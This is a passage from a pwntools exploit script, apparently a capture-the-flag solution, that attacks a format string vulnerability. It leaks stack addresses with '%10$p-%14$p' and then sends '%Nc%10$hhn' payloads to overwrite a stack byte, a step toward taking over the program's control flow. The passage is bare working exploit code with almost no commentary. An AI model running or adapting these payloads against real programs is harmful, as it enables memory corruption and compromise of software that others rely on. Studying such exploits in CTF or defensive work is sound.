...
p.sendline(b'1')
p.recvuntil(b'Input:\n')
payload=b'aaaa%10$p-%14$p'
p.sendline(payload)
p.recvuntil(b'aaaa0x')
stack_addr=int(p.recvuntil(b'-')[:-1],16)
print('stack_addr',hex(stack_addr))
p.recvuntil(b'0x')
stack_addr2=int(p.recvuntil(b'\n').strip(),16)
print('stack_addr2',hex(stack_addr2))
pause()
# 检查最后两位
behind=stack_addr&0xff
if behind>0x18:
    new_behind=behind-0x18
else:
    p.close()
pause()
p.recvuntil(b'leave\n')
p.sendline(b'1')
p.recvuntil(b'Input:\n')
payload=b'%'+str(new_behind).encode()+b'c%10$hhn'
p.sendline(payload)
p.recvuntil(b'leave\n')
p.sendline(b'1')
p.recvuntil(b'Input:\n')
